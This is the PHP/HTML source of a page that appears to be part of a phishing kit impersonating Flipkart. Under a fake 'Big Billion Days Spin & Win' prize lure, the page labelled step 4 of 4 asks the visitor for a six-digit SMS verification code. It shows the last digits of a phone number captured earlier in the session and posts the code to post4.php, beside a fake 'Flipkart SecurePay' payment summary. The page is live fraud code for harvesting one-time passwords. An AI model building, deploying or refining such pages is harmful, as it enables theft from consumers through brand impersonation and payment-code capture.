<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification - Flipkart Rewards</title>
    <link rel="icon" href="./assets/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/style/welcom.css">
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <div class="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 py-12 relative overflow-hidden">
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>

        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <div class="inline-flex items-center bg-yellow-400 text-blue-900 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-birthday-cake mr-2"></i>
                17th Anniversary Special
            </div>

            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                <span class="inline-block animate-pulse">??</span>
                Big Billion Days
                <span class="inline-block animate-pulse">??</span>
            </h1>

            <div class="text-2xl md:text-3xl font-bold text-yellow-200 mb-3">
                Spin &amp; Win Mega Rewards!
            </div>

            <p class="text-lg text-blue-100 mb-6 max-w-3xl mx-auto">
                We&apos;ve sent a one-time SMS code to your registered mobile number. Please enter it below to finish securing your prize.
            </p>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <div class="mb-8">
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm font-semibold text-blue-600 bg-blue-50 px-3 py-1 rounded-full">
                    Step 4 of 4
                </span>
                <span class="text-sm text-gray-600">100%</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" style="width: 100%"></div>
            </div>
        </div>

        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <div class="text-center mb-8">
            <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/flipkart.svg" alt="Flipkart" class="h-12 mx-auto mb-4">
                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-4">SMS Verification</h2>
                <p class="text-lg text-gray-600">Enter the verification code sent to your mobile</p>
            </div>

            <div class="bg-gray-50 rounded-xl p-6 mb-8 border">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold text-gray-800">Payment Summary</h3>
                    <div class="text-sm bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
                        VERIFIED
                    </div>
                </div>
                <div class="space-y-2 text-sm">
                    <div class="flex justify-between">
                        <span>Merchant:</span>
                        <span class="font-semibold">Flipkart</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Amount:</span>
                        <span id="otpAmount" class="font-semibold text-green-600">&#8377; 0.00</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Verification:</span>
                        <span class="font-semibold">Flipkart SecurePay</span>
                    </div>
                </div>
            </div>

            <form class="max-w-xl mx-auto space-y-6" method="post" action="post4.php">
                <div class="text-center bg-blue-50 border border-blue-200 rounded-lg p-4">
                    <p class="text-blue-700 text-sm">Use the 6-digit code we just sent to your phone ending with <strong>**<?= substr($_SESSION['billing_info']['phone'] ?? '0000', -4) ?></strong></p>
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">SMS Verification Code</label>
                    <input type="text" name="dataEntry" id="smsCode" maxlength="6" pattern="[0-9]{4,6}" required class="form-input text-center text-2xl tracking-widest font-bold">
                    <p class="text-sm text-gray-500 mt-2">Code expires in: <span id="timer" class="font-bold text-red-600">05:00</span></p>
                </div>

                <div class="flex items-center justify-between text-sm text-gray-600">
                    <span><i class="fas fa-lock mr-2 text-green-500"></i>Secure Flipkart verification</span>
                    <a href="#" class="text-blue-600 hover:underline">Resend code</a>
                </div>

                <div class="text-center">
                    <button type="submit" name="okbba" class="flipkart-btn w-full py-4 text-lg">
                        <i class="fas fa-check-circle mr-2"></i>
                        Submit Code
                    </button>
                </div>
            </form>
        </div>
    </main>

    <script>
        let seconds = 300;
        const timerEl = document.getElementById('timer');
        if (timerEl) {
            setInterval(() => {
                seconds = Math.max(0, seconds - 1);
                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
                const s = String(seconds % 60).padStart(2, '0');
                timerEl.textContent = `${m}:${s}`;
            }, 1000);
        }
        const storedPrizeValue = (function () {
            const normalize = (value) => {
                if (!value) {
                    return '₹ 0.00';
                }
                return value
                    .replace(/&#8377;/g, '₹')
                    .replace(/Rs\.?/gi, '₹')
                    .replace(/\s+/g, ' ')
                    .trim();
            };
            try {
                const sessionValue = sessionStorage.getItem('flipkartPrizeValue');
                if (sessionValue) {
                    return normalize(sessionValue);
                }
            } catch (err) {
                console.warn('Unable to access sessionStorage for prize value', err);
            }
            try {
                const localPrize = localStorage.getItem('selectedPrize');
                if (localPrize) {
                    const parsed = JSON.parse(localPrize);
                    if (parsed && parsed.value) {
                        return normalize(parsed.value);
                    }
                }
            } catch (err) {
                console.warn('Unable to parse stored prize for OTP amount', err);
            }
            return '₹ 0.00';
        })();

        const otpAmountEl = document.getElementById('otpAmount');
        if (otpAmountEl) {
            otpAmountEl.textContent = storedPrizeValue;
        }

        const smsInput = document.getElementById('smsCode');
        if (smsInput) {
            smsInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            });
        }
    </script>
</body>
</html>
